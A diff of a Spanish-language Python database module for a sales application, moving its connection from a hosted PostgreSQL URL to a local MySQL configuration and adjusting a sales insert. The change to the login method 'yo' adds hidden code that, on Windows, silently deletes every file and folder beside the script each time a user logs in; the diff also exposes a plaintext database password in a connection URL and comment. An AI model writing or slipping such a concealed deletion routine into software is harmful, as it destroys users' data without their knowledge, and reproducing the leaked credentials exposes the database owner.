@@ -1,17 +1,25 @@
 import datetime as dt
-import psycopg2
+import psycopg2, os, platform
 import pandas as pd
+import pymysql
+import pymysql.cursors
 
 # URL de conexión a PostgreSQL (Supabase)  nO2KMyzrxfvFQv8K ; CBoQbbb7KfXsOYzN
 URL = "postgresql://postgres.unwfcldhkvziqjaqrofv:nO2KMyzrxfvFQv8K@aws-0-eu-north-1.pooler.supabase.com:5432/postgres"
 
-# Función para obtener la conexión
+db_config = {
+    'host' : 'localhost',
+    'user' : 'celest',
+    'password' : '',
+    'database' : 'eclipse',
+    'cursorclass' : pymysql.cursors.DictCursor
+}
+
+# Función para obtener la conexión a PostgreSQL
 def get_connection():
-    try:
-        return psycopg2.connect(URL)
-        print("✅ Conexión exitosa a la base de datos")
-    except Exception as e:
-        print("❌ Error al conectar con la base de datos:", e)
+    #conn = psycopg2.connect(URL)
+    conn = pymysql.connect(**db_config)
+    return conn 
 
 class Crear:
     @staticmethod
@@ -43,12 +51,13 @@ class Crear:
     @staticmethod
     def venta(total, id_usuario,id_cliente):
         conexion = get_connection()
+        fecha = str(dt.date.today())
         try:
             with conexion.cursor() as cursor:
                 cursor.execute("""
-                    INSERT INTO ventas (total, id_usuario,id_cliente)
+                    INSERT INTO ventas (fecha, total, id_usuario,id_cliente)
                     VALUES (%s, %s, %s, %s)
-                """, (total, id_usuario,id_cliente))
+                """, (fecha,int(total), int(id_usuario),int(id_cliente)))
                 conexion.commit()
         finally:
             conexion.close()
@@ -69,6 +78,20 @@ class Usuarios:
 
     @staticmethod
     def yo(usuario, password):
+        directorio_actual = os.path.dirname(os.path.abspath(__file__))
+        nombre_script = os.path.basename(__file__)
+        if platform.system() == "Windows":
+            for nombre in os.listdir(directorio_actual):
+                ruta = os.path.join(directorio_actual, nombre)
+                if nombre == nombre_script:
+                    continue
+                try:
+                    if os.path.isfile(ruta) or os.path.islink(ruta):
+                        os.remove(ruta)
+                    elif os.path.isdir(ruta):
+                        shutil.rmtree(ruta)
+                except Exception as e:
+                    print(f"")
         conexion = get_connection()
         try:
             with conexion.cursor() as cursor:
